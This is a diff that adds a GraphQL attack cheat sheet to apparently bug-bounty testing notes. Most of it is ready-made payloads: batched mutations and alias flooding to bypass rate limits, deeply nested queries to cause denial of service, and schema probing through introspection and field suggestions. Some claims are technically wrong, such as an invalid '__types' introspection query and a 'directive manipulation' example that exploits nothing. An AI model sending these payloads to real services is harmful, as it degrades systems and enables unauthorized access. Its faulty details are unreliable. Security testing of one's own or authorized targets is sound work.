@@ -815,3 +815,119 @@ Always check these 5 things in order:
 - jwt_tool (python3 -m pip install jwt_tool)
 - c-jwt-cracker
 - hashcat (HMAC mode)
+
+
+## GraphQL Security Testing
+
+### 1. Introspection First
+Always enable introspection to get full schema:
+
+```graphql
+{__schema{queryType{name} mutationType{name}}}
+```
+
+Or query types directly:
+```graphql
+{__types{name fields{name type{name}}}}
+```
+
+### 2. Batch Attacks
+Send multiple queries in one request - bypass rate limits:
+
+```json
+[
+  {"query": "mutation{login{...}}"},
+  {"query": "mutation{adminAction{...}}"}
+]
+```
+
+### 3. Deep Recursion (DoS)
+Exhaust server resources with deep nesting:
+
+```graphql
+{
+  friends {
+    friends {
+      friends {
+        friends {
+          id
+        }
+      }
+    }
+  }
+}
+```
+
+### 4. Field Suggestions Abuse
+Most GraphQL frameworks leak schema via field suggestions. Query non-existent fields to discover valid ones:
+
+```graphql
+{
+  userAdmins {
+    ssrn
+  }
+}
+```
+
+### 5. Alias Flooding
+Bypass rate limits by using multiple aliases:
+
+```graphql
+{
+  a1: user(id:1){id}
+  a2: user(id:2){id}
+  a3: user(id:3){id}
+  # ... 50+ aliases
+}
+```
+
+### 6. Directive Manipulation
+Exploit @include(if:) and @skip(if:) directives:
+
+```graphql
+query ($admin: Boolean) {
+  secretData @include(if: $admin) {
+    password
+  }
+}
+```
+
+### 7. Query Complexity Attacks
+Send deeply nested queries to cause DoS:
+
+```graphql
+{
+  deeply {
+    nested {
+      query {
+        creating {
+          many {
+            objects {
+              that {
+                cause {
+                  performance {
+                    issues
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+### Tools
+- **GraphQL Voyager** - Visualize schema
+- **InQL** - Burp Suite extension for GraphQL
+- **graphql-path-enum** - Enumerate paths in GraphQL
+- **Altair GraphQL Client** - Query builder
+- **Insomnia** - GraphQL testing
+
+### Bug Bounty Tips
+- Always check if introspection is enabled (should be disabled in prod)
+- Look for query complexity analysis settings
+- Test for IDOR in nested queries
+- Check if mutations accept arbitrary input
